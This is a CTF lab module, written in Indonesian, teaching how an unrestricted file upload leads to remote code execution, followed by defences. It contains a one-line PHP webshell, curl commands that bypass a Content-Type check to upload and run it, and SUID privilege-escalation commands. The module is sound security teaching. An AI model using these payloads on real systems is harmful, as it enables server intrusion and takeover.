# Modul 3 · Unrestricted File Upload → RCE

> Lab: **03-snapgallery** · Kesulitan: medium · Prasyarat: Modul 1–2, dasar HTTP

## Yang akan Anda pelajari

- Kenapa validasi upload yang "percaya client" bisa ditembus.
- Perbedaan validasi ekstensi, MIME/Content-Type, dan isi file (magic bytes).
- Cara webshell memberi eksekusi perintah (RCE).
- Privilege escalation lewat file ber-SUID.

## Teori singkat

Fitur upload menerima file dari pengguna lalu menyimpannya. Jika aplikasi tidak
membatasi **jenis dan nama** file dengan benar, penyerang bisa meng-upload skrip
(mis. `.php`) ke folder yang dieksekusi server → **webshell**:

```php
<?php system($_GET['c']); ?>
```

Buka `uploads/shell.php?c=id` → server menjalankan `id`. Itu RCE.

### Validasi yang salah

| Dicek | Bisa dipalsukan? |
|---|---|
| `Content-Type` yang dikirim browser | **Ya**, sepenuhnya dikontrol client |
| Ekstensi dari nama file | Ya (ganti nama, double-ext, case) |
| Magic bytes (isi awal file) | Lebih sulit, tapi bisa dibuat polyglot |

Mesin lab ini hanya memeriksa `Content-Type`. Dengan curl/Burp Anda mengirim file
`.php` tapi menandainya `image/png` — lolos, lalu dieksekusi.

### SUID (untuk privesc)

File ber-bit SUID berjalan dengan hak **pemiliknya**, bukan pemanggilnya. Kalau
`/bin/bash` ber-SUID root, `bash -p` memberi shell dengan hak root. Audit SUID
(`find / -perm -4000`) adalah langkah privesc klasik.

## Cara mengenali

- Ada fitur upload (foto profil, lampiran, dokumen).
- Setelah upload, file bisa diakses lewat URL yang bisa ditebak (`/uploads/...`).

## Praktik (lab 03-snapgallery)

```bash
./ctf-tmux 03-snapgallery
echo '<?php system($_GET["c"]); ?>' > shell.php
curl -s -F 'photo=@shell.php;type=image/png' $TARGET/upload.php     # bypass MIME
curl -s "$TARGET/uploads/shell.php?c=id"                            # RCE
```

**Target:** RCE → flag `user`; (docker) SUID → flag `root`.
Hint: [`README.md`](README.md). Pembahasan: [`solution/WRITEUP.md`](solution/WRITEUP.md).

## Checklist lulus

- [ ] Anda paham kenapa mengecek `Content-Type` saja tidak aman.
- [ ] Anda meng-upload webshell dan menjalankan perintah.
- [ ] Anda membaca flag `user`.
- [ ] (docker) Anda menemukan SUID dan naik ke root.

## Dunia nyata

Upload tak terbatas = salah satu jalur RCE paling umum di aplikasi web. Sering
dikombinasikan dengan path traversal pada nama file untuk menaruh shell di lokasi
pilihan.

## Pertahanan

- **Buat ulang nama & ekstensi** dari whitelist aman; jangan pakai nama asli.
- Verifikasi tipe file di server (magic bytes), bukan Content-Type.
- **Matikan eksekusi skrip** di folder upload; simpan di luar web root.
- Batasi ukuran & jenis; jalankan dengan hak minimum.

## Lanjut

➡️ **Modul 4 · [Broken Authentication](../04-cookiejar/MATERI.md)** (lab 04-cookiejar)
